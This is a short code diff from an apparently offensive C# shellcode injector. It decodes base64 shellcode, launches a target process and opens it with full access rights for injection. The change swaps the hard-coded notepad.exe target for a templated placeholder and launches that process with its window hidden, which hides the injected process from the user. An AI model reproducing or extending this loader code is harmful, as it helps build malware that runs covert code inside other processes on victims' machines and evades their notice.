@@ -30,7 +30,11 @@ using System.Diagnostics;
                 byte[] shellcode = new byte[] { };
                 shellcode = Convert.FromBase64String(b64);
 
-                Process target = Process.Start("notepad.exe");
+                //Process target = Process.Start("%%TARGETPS%%");
+                Process target = new Process();
+                target.StartInfo = new ProcessStartInfo("%%TARGETPS%%");
+                target.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
+                target.Start();
 
                 var target_pid = target.Id;
                 IntPtr hProcess = OpenProcess(0x001F0FFF, false, target_pid); //PROCESS_ALL_ACCESS (0x001F0FFF) //dwProcessId == 4804 //bInheritHandle for child process
